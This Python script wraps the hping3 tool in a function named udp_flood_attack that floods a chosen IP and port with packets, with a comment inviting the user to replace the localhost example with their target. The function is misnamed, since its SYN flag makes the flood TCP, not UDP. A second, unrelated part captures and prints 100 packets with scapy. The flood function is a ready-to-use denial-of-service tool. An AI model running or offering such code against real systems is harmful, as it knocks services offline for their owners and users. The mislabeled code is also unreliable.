import subprocess

def udp_flood_attack(target_ip, target_port):
    # Construct the hping command
    hping_command = [
        "sudo",
        "hping3",
        "-c", "10000",        # Number of packets to send
        "-d", "120",          # Data size
        "-S",                 # Set SYN flag
        "-w", "64",           # TCP window size
        "-p", str(target_port),  # Target port
        "--flood",            # Flood mode
        target_ip             # Target IP address
    ]

    try:
        # Execute the hping command
        subprocess.run(hping_command)
    except Exception as e:
        print("An error occurred:", e)

# Example usage
target_ip = "127.0.0.1"  # Replace with your target IP address
target_port = 80         # Replace with your target port
udp_flood_attack(target_ip, target_port)

from scapy.all import sniff

def analyze_packets(packet):
    # Extract relevant information from the packet
    src_ip = packet[0][1].src
    dst_ip = packet[0][1].dst
    protocol = packet[0][1].proto
    packet_size = len(packet)

    # Print out the packet information
    print(f"Source IP: {src_ip}, Destination IP: {dst_ip}, Protocol: {protocol}, Packet Size: {packet_size}")

def capture_traffic():
    print("Capturing network traffic...")
    # Use Scapy's sniff function to capture network packets
    sniff(prn=analyze_packets, count=100)

if __name__ == "__main__":
    capture_traffic()
